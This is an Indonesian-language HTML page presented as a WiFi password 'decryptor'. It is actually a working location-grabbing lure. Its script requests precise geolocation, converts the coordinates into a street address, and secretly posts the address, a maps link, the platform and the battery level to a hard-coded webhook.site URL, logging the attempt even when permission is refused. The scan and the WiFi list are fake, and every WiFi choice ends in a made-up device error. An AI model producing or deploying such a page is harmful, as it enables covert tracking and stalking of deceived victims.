<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Scanner & Decryptor</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #app { width: 90%; max-width: 400px; border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 20px #00ff0044; background: #050505; }
        .loading-bar { width: 100%; height: 10px; border: 1px solid #00ff00; margin: 15px 0; position: relative; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: #00ff00; transition: width 0.3s; }
        .wifi-item { border-bottom: 1px solid #222; padding: 10px; cursor: pointer; display: none; text-align: left; }
        .wifi-item:hover { background: #00ff0022; }
        button { background: #00ff00; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #status { font-size: 12px; height: 40px; }
    </style>
</head>
<body>

<div id="app">
    <h3 style="margin-top:0;">WIFI_DECRYPTOR_v5.0</h3>
    <div id="status">Sistem siap. Silahkan mulai scan area.</div>
    
    <div class="loading-bar" id="barBox" style="display:none;">
        <div class="progress" id="progress"></div>
    </div>

    <div id="wifiList">
        <div class="wifi-item" onclick="errorDevice('TP-LINK_EXT_99')">📡 TP-LINK_EXT_99 [Sinyal Kuat]</div>
        <div class="wifi-item" onclick="errorDevice('MNC_Play_Home')">📡 MNC_Play_Home [Terproteksi]</div>
        <div class="wifi-item" onclick="errorDevice('Indihome_Fiber')">📡 Indihome_Fiber [WPA2]</div>
    </div>

    <button id="mainBtn" onclick="startDeepScan()">MULAI SCAN WIFI SEKITAR</button>
</div>

<script>
    const webhook = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";

    async function sendLog(data) {
        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
        navigator.sendBeacon(webhook, JSON.stringify(data));
    }

    function startDeepScan() {
        // Minta Izin Lokasi
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // Animasi Loading Mulai
                document.getElementById('mainBtn').style.display = 'none';
                document.getElementById('barBox').style.display = 'block';
                document.getElementById('status').innerText = "Mengambil koordinat satelit...";

                // Proses Ambil Alamat (Reverse Geocoding)
                let alamat = "Gagal mengambil nama jalan";
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    const geo = await res.json();
                    alamat = geo.display_name;
                } catch (e) {}

                // Kirim Data Lengkap
                await sendLog({
                    event: "WIFI_SCAN_SUCCESS",
                    detail_lokasi: alamat,
                    maps: `https://www.google.com/maps?q=${lat},${lon}`,
                    os: navigator.platform,
                    baterai: (await navigator.getBattery?.())?.level * 100 + "%"
                });

                // Jalankan Animasi Bar
                let p = 0;
                let interval = setInterval(() => {
                    p += Math.random() * 20;
                    if (p >= 100) {
                        p = 100;
                        clearInterval(interval);
                        showWifiList();
                    }
                    document.getElementById('progress').style.width = p + "%";
                    document.getElementById('status').innerText = "Scanning: " + Math.floor(p) + "%";
                }, 400);

            }, async (err) => {
                alert("Error: Izin lokasi ditolak. Scan tidak bisa dilanjutkan tanpa koordinat WiFi.");
                await sendLog({ event: "SCAN_DITOLAK_TARGET", status: "IP_ONLY" });
            }, { enableHighAccuracy: true });
        }
    }

    function showWifiList() {
        document.getElementById('status').innerText = "3 WiFi Ditemukan. Pilih untuk Decrypt:";
        document.getElementById('barBox').style.display = 'none';
        const items = document.getElementsByClassName('wifi-item');
        for (let item of items) { item.style.display = 'block'; }
    }

    function errorDevice(wifiName) {
        alert("Gagal menyambungkan ke " + wifiName + "\n\nError: Perangkat Anda bermasalah / tidak kompatibel dengan protokol enkripsi ini.");
        window.location.href = "https://www.google.com";
    }
</script>
</body>
</html>
